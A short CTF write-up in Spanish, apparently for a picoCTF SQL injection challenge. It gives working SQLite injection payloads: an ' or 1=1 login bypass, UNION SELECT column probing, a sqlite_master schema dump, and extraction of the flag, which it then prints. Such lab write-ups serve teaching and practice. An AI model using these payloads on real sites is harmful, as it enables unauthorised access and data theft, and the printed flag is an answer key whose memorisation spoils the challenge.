Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Hints:
1.-SQLiLite
### Solución
```
Primero se accede metiendo la inyeccion en la parte de contraseña con
' or 1=1; y usuario admin, de este modo de arrojara verdadero y dara acceso

Nos damos cuenta que hay un campo de busqueda con el cual se checa cuantos campos tienen las tablas con
' union select 1,2,3

al ver que la inyeccion se efectua podemos ver las tablas con: ' UNION SELECT 1,2,sql FROM sqlite_master;

CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)
CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)
CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)
CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)

debemos de ver la tabla more_table que se ve contiene la flag: ' UNION SELECT 1,2,flag FROM more_table;

picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```